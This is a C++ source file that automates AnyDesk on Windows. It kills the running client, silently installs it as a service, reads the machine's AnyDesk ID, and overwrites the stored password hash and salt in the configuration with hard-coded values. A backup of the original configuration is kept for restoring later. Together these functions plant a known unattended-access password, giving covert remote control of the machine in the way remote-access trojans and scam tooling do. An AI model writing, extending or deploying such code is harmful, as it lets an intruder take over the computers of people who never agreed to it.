#include "stdafx.h"
#include "AnydeskSet.h"
#include "utils.h"
#include "WinReg.hpp"


string new_pwd_hash = "ad.anynet.pwd_hash=733f8f71e9ef61461b37a76972d0479d42b744b1ba6180b758325815368afa2d\n";
string new_pwd_salt = "ad.anynet.pwd_salt=c116e7b1e1839920e1f3c360337b4181\n";

void changePassword(std::string& strTmpConf, std::string& servicePath)
{
	if (!exist_file(strTmpConf))
		CopyFile(servicePath.c_str(), strTmpConf.c_str(), false);

	bool bchange = false;
	ifstream inFile;
	string strline;
	vector<string> fileinfo;
	inFile.open(servicePath);
	file_log("Change Password------>");
	while (getline(inFile, strline))
	{
		std::size_t found = strline.find("ad.anynet.pwd_hash=");
		if (found != std::string::npos) //exist
		{
			bchange = true;
			fileinfo.push_back(new_pwd_hash);
		}
		else
		{
			found = strline.find("ad.anynet.pwd_salt=");
			if (found != std::string::npos) //exist
			{
				bchange = true;
				fileinfo.push_back(new_pwd_salt);
			}
			else
			{
				fileinfo.push_back(strline);
			}
		}
	}
	if (!bchange)
	{
		fileinfo.push_back(new_pwd_hash);
		fileinfo.push_back(new_pwd_salt);
	}
	inFile.close();
	std::ofstream ofs;
	ofs.open(servicePath, std::ios_base::out);
	for (unsigned int i = 0; i < fileinfo.size(); i++)
	{
		ofs << fileinfo[i] << endl;
		file_log(fileinfo[i]);
	}
	ofs.close();
	file_log("<------Change Password");
}

void restorePassword(std::string& strTmpConf, std::string& servicePath)
{
	if (exist_file(strTmpConf))
	{
		if (exist_file(servicePath))
		{
			DeleteFile(servicePath.c_str());
		}
		rename(strTmpConf.c_str(), servicePath.c_str());
	}
}

void runAnyDesk(string& path)
{
	PROCESS_INFORMATION processInfo;
	STARTUPINFO info = { sizeof(info) };
	if (CreateProcess(path.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

string GetAnyDeskInstallPath()
{
	string path = "";

	HKEY hKey = nullptr;
	if (::RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\AnyDesk",
		REG_NONE,           // default options
		KEY_ALL_ACCESS | KEY_WOW64_32KEY,
		&hKey
	) == ERROR_SUCCESS) {
		winreg::RegKey key;
		key.Open(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\AnyDesk", KEY_ALL_ACCESS | KEY_WOW64_32KEY);
		path = to_byte_string(key.GetStringValue(L"DisplayIcon"));

		if (!path.empty())
		{
			path = std::regex_replace(path, std::regex("\""), "");
		}

		RegCloseKey(hKey);
	}


	return path;
}

string getID(std::string& pathAnydeskDataName, std::string& sysconfigpath)
{
	string anydesk_id;
	string searchstr = "ad.anynet.id=";

	if (exist_directory(pathAnydeskDataName))
	{
		if (exist_file(sysconfigpath))
		{
			ifstream inFile;
			string strline;
			inFile.open(sysconfigpath);
			while (getline(inFile, strline))
			{
				std::size_t found = strline.find(searchstr);
				if (found != std::string::npos)
				{
					anydesk_id = strline.substr(searchstr.length());
				}
			}
			inFile.close();
		}
	}

//	if (anydesk_id.length() == 0)
//		bFlagAnyDeskInstall = FALSE;

	return anydesk_id;
}

void installAnydesk(std::string& anydesk_true_path)
{
	file_log("installing anydesk");

	killProcessByName("AnyDesk.exe");

	//get installation path
	const char* programFilesPath = getenv("ProgramFiles");
	const char* programFilesx86Path = getenv("ProgramFiles(x86)");

	if (programFilesx86Path != NULL) {
		string installpath(programFilesx86Path);
		installpath += "\\Anydesk";

		file_log(anydesk_true_path + " --silent --install \"" + installpath + "\"");

		run_in_service(anydesk_true_path + " --silent --install \"" + installpath + "\"");

	}
	else if (programFilesPath != NULL) {
		string installpath(programFilesPath);
		installpath += "\\Anydesk";

		run_in_service(anydesk_true_path + " --silent --install \"" + installpath + "\"");
	}

}